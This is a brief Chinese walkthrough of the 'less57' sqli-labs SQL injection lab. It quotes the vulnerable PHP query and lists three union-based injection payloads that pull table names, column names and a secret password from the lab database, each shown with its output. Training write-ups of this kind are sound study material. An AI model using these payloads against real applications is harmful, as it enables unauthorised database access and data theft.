---
title: less57
url: https://www.yuque.com/u29002979/ep2zrx/zcviismb2gu06f2d
---

```bash
$id= '"'.$id.'"';
// Querry DB to get the correct output
$sql="SELECT * FROM security.users WHERE id=$id LIMIT 0,1";
```

此关闭合方式为双引号**"**,在十四次之内找到通关密码即可

```bash
爆破数据表 
?id=-1" union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()--+ 
数据表：4tx6x8i0r6

爆破数据字段
?id=-1" union select 1,2,group_concat(column_name)from information_schema.columns where table_name='4tx6x8i0r6'--+ 
字段：secret_5NSX

获取密码
?id=-1"union select 1,2,(select secret_5NSX from 4tx6x8i0r6)--+
密码：UpYmUvGqIBq77VJwWtBdP1s7
```
